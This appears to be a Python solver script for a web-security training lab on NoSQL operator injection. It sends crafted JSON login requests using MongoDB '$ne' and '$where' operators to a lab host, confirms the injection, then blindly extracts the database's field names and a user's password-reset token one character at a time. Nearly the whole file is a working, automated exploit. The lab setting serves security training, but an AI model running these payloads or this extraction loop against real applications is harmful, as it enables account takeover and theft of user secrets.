# NoSQL injection 22 of 24
# Lab: Exploiting NoSQL operator injection to extract unknown fields

import asyncio
from pprint import pprint
from common.base import run_payloads
from urllib.parse import quote_plus as urlencode_str

from common.payload_generators import generate_alphanumeric

RAW_REQUEST = """
POST /login HTTP/2
Host: 0afa00a9042b097080efc1cd00d500a3.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:155.0) Gecko/20100101 Firefox/155.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0afa00a9042b097080efc1cd00d500a3.web-security-academy.net/login
Content-Type: application/json
Content-Length: 39
Origin: https://0afa00a9042b097080efc1cd00d500a3.web-security-academy.net
Connection: keep-alive
Cookie: session=of2ct3mRWO8YKwXwiu6cH1hhjBoD1ZlT
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Pragma: no-cache
Cache-Control: no-cache

@@@PAYLOAD@@@
""".strip()

RAW_REQUEST_FORGOT = """
GET /forgot-password?@@@PAYLOAD@@@ HTTP/2
Host: 0afa00a9042b097080efc1cd00d500a3.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:155.0) Gecko/20100101 Firefox/155.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0afa00a9042b097080efc1cd00d500a3.web-security-academy.net/login
Content-Type: application/json
Content-Length: 39
Origin: https://0afa00a9042b097080efc1cd00d500a3.web-security-academy.net
Connection: keep-alive
Cookie: session=of2ct3mRWO8YKwXwiu6cH1hhjBoD1ZlT
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Pragma: no-cache
Cache-Control: no-cache
""".strip()

async def one_call(raw_req):
    """A simple call. Returns the response"""

    result = await run_payloads(raw_req, [{}], lambda x: True, follow_redirects=True)
    return result

async def print_net_result(raw_req, print_response_body=False):
    result = await one_call(raw_req)
    if result['status_code'] in [200]:
        secs = result['total_seconds']
        print(f" CALL OK, {secs:.2f} secs")
        if print_response_body: pprint(result['full_text'])
        return True, result['full_text']
    else:
        print(" CALL FAILED")
        if print_response_body: pprint(result['full_text'])
        return False, result['full_text']

def xmlencode (text: str) -> str:
    return "".join(f"&#x{ord(c):X};" for c in text)

def resp_lock (body: str) -> bool:
    """Returns True if the response is "Invalid username or password" and False if it is "Account locked: please reset your password" """
    if not body:
        raise Exception("Empty response")
    elif 'Invalid username or password' in body:
        return False
    elif 'Account locked' in body:
        return True
    else:
        raise Exception(f"Unexpected response: {body}")

async def main():

    # It returns "Invalid username or password"
    raw_req_0 = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":"carlos","password":"test"}''')
    print('PLAIN CALL:', end='')
    _, result = await print_net_result(raw_req_0, False)

    # It returns "Account locked: please reset your password"
    raw_req_3 = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":"carlos","password":{"$ne":"invalid"}}''')
    print('Trying $ne on password:', end='')
    _, result = await print_net_result(raw_req_3, False)

    # It returns "Invalid username or password"
    raw_req_5a = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":"carlos","password":{"$ne":"invalid"},"$where": "0"}''')
    print('Inject $where (false):', end='')
    _, resp = await print_net_result(raw_req_5a, False)
    print('   ' + (resp_lock(resp) and 'Account locked' or 'Invalid username or password'))

    # It returns "Account locked: please reset your password"
    raw_req_5c = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":"carlos","password":{"$ne":"invalid"},"$where": "1"}''')
    print('Inject $where (true):', end='')
    _, resp = await print_net_result(raw_req_5c, False)
    print('   ' + (resp_lock(resp) and 'Account locked' or 'Invalid username or password'))

    # Now, we know that we can inject interesting code in the $where clause, now we'll use it for fields extraction

    async def test (idx, pos, char):
        raw_req_7 = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":"carlos","password":{"$ne":"invalid"},"$where":"Object.keys(this)[§idx§].match('^.{§pos§}§char§.*')"}''')
        raw_req_7 = raw_req_7.replace('§idx§', str(idx)).replace('§pos§', str(pos)).replace('§char§', char)
        print(f'Testing {char} in position {pos} for field {idx}:', end='')
        _, resp = await print_net_result(raw_req_7, False)
        return resp_lock(resp)

    async def extract_key(idx):
        building = ''
        for pos in range(0, 20):
            for char in generate_alphanumeric():
                isok = await test(idx, pos, char)
                if isok: building += char; break
            else:
                # print(f'Field name: {building}')
                # break
                return True, building
        else:
            # print('Too long')
            return False, building

    fields = [] # ['', 'username', 'password', 'email', 'resetToken']
    try:
        for idx in range(0, 10):
            isok, fieldname = await extract_key(idx)
            if not isok:
                print(f'(incomplete) Field name: {fieldname}')
                break
            else:
                print(f'Field name: {fieldname}')
                fields.append(fieldname)
                print(fields)
    except Exception as e:
        print(f'Exception: {e}')
        print(f'Fields found so far: {fields}')

    # It returns the same as without params
    raw_req_8b = RAW_REQUEST_FORGOT.replace("@@@PAYLOAD@@@", "foo=invalid")
    print('With error:', end='')
    await print_net_result(raw_req_8b, False)

    # It returns "Invalid token", so we know that the resetToken field is the correct one to use
    raw_req_8c = RAW_REQUEST_FORGOT.replace("@@@PAYLOAD@@@", "resetToken=invalid")
    print('With error:', end='')
    await print_net_result(raw_req_8c, True)

    # Now, we need the correct resetToken value. We can exfiltrate it from the database using the login endpoint

    building = ''
    for pos in range(0, 20):
        for char in generate_alphanumeric():

            raw_req_9 = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":"carlos","password":{"$ne":"invalid"},"$where":"this.resetToken.match('^.{§pos§}§char§.*')"}''')
            raw_req_9 = raw_req_9.replace('§pos§', str(pos)).replace('§char§', char)
            print(f'Testing {char} in position {pos}:', end='')
            _, resp = await print_net_result(raw_req_9, False)
            if resp_lock(resp):
                building += char
                print('(partial) resetToken:', building)
                break
        else:
            print('resetToken:', building)
            break




if __name__ == "__main__":
    asyncio.run(main())